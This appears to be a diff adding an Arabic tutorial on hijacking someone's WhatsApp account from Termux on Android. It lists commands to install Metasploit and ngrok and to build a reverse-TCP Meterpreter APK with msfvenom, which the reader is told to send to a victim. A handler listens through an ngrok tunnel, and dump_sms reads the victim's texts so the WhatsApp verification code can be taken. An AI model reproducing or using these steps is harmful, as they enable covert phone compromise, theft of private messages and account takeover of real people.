@@ -1,0 +1,170 @@
+♦السلام عليكم ورحمه الله وبركاته♦
+
+★شرح اختراق الواتس من termux ★
+
+#الخطوه_الاولى تثبيت metasploit الي مثبته خلاص
+✿
+#الاوامر
+✿
+
+→ apt update && apt upgrade -y
+
+→ apt 0 git
+
+→ apt install python3
+
+→ apt install python
+
+→ apt install ruby
+
+→ apt install wget
+
+→ apt install unzip
+
+→ apt install zip
+
+→ apt install nano
+
+→ apt install perl
+
+→ apt install curl
+
+→ apt install proot
+
+→ wget https://Auxilus.github.io/metasploit.sh
+
+→ ls
+
+→ bash metasploit.sh
+
+→ ls
+
+→ cd metasploit-framework
+
+→ ls
+
+→ gem install bundle
+
+→ gem install bundler
+
+→ pip2 install bundler
+
+→ bundle config build.nokogiri --use-system-libraries
+
+→ bundle install
+
+→ bundle update nokogiri
+
+→ gem install nokogiri
+
+→ gem install nokogiri -- --use-system-libraries
+
+→ gem install pkg-config -v "~> 1.1"
+
+→ pkg-config
+
+→bundle update nokogiri
+
+→ pg_ctl -D $PREFIX/var/lib/postgresql start
+
+→ msfconsole
+
+الان رح تشتغل الاداه بدون مشاكل
+
+---------------------------------------------------------------
+
+
+#الخطوة_الثانيه✿
+
+♥تثبيت اداه ngrok لفتح البورتات♥
+
+#الاوامر↓✿
+✿
+اول شي رح تسجل في هاذا الموقع↓✿
+www.ngrok.com
+بعدها رح تحصل كلمه linux arm دز عليها رح تتحمل معك اداه ngrok ملف مظغوط رح تنقله للذاكره الداخليه خارج مع الملفات
+والان رح  تنزلو تحت شوي في الموقع رح تحصلو رقم 3 وعليه رابط زي ذا↓✿
+./ngrok authtokenyrifjgbhdjgnbvjgcbn_gfvhfhvcbgf
+
+رح تنسخون واحتفظوا به لاننا رح نستخدمه على termux  ✿
+
+#تابعوا #الاوامر
+
+→ apt update && apt upgrade
+
+→ cd /sdcard
+
+→ ls
+
+→ mv ngrok-stable-linux-arm.zip $HOME
+
+→ cd
+
+→ ls
+
+→ unzip ngrok-stable-linux-arm.zip
+
+→ rm -rif ngrok-stable-linux-arm.zip
+
+→ ls
+
+←الان رح تحط الرابط الي حصلتوه من الموقع وانتر
+
+*الان رح نكتب امر تشغيل اداه نجروك بأمر↓
+
+→ ./ngrok tcp 4444
+
+★الان رح تفتح الاداه بدون*★
+
+
+★********************************★
+
+
+#الخطوه_الثالثه_الاخيره
+
+
+¥الان رح تقلق كل نوافذ termux وتكتب هاي الاوامر بالترتيب↓
+
+←افتح اداه ngrok ↓✿
+ls
+
+./ngrok tcp 4444
+
+←الان رح تفتح نافذه جديده ورح تكتب اوامر صنع بايلود لاختراق الضحيه↓✿
+
+♦اوامر صنع بايلود لاختراق الضحيه ↓✿
+
+→ msfvenom -p android/meterpreter/reverse_tcp LHOST=★★★★★ LPORT=4444 R > /sdcard/termux.apk
+
+¥رح تحط بدل ★★★★★ الip الخارجي الخاص بجهازك 
+لمعرفه الip الخارجي الخاص بك افتح نافذه جديده واكتب امر ifconfig ورح يطلع لك الip  اذا ماعرفتوا مكانه حمل برنامج fing ورح تحصلوه بسهوله بعد ماتحصله انسخه وحطه مكان★★★★★ #وحط_انتر
+
+←واالان انتظروا لين مايخلص صنع البايلود بعد مايخلص رح تحصله في الذاكره الداخليه خارج مع الملفات بأسم termux ارسله للضحيه الي بدك تخترقه 
+بعد مايثبته بجواله ويفتح اكتبوا هاذي الاوامر بالترتيب↓
+
+→ msfconsole 
+هاذا الامر لفتح اداه metasploit بعد ماتفتتح اكتبوا الاوامر هاذي↓↓
+
+→ use exploit/multi/handler 
+
+→ set payload android/meterpreter/reverse_tcp
+
+→ set lhost  رح تحط هنا الايبي
+
+→ set lport هنا البورت الي فتحته باداه نجروك
+
+→ exploit
+
+→ الان رح تحملوا واتساب وتحطوا رقم الضحيه انتر بيوصله الكود عند الضحيه #اكتب هاي الاوامر لاختراق رسايل الضحيه ↓
+
+→ dump_sms
+
+←الان رح يطلع لكم ملف بصيغه txt فيها كل الرسائل الي عنده حط امر exit  وبعدها ls لاظهار الملفات بتحصل الرسائل في ملف txtلاظهار الرسايل الي في الملف ↓
+
+←حط امر  cat 99999.txt
+
+←غير كلمه.99999.txt اسم الملف الي رح يطلع لك بتحصل الكود الي وصله بتنسخه وتروح الواتس تكتبه ومبروك عليك الاختراقط
+
+#ملاحظه تبقى اداه ngrok شغاله لاخر الاختراق
+
+♥انشاء الله يكون الشرح واضح ❤
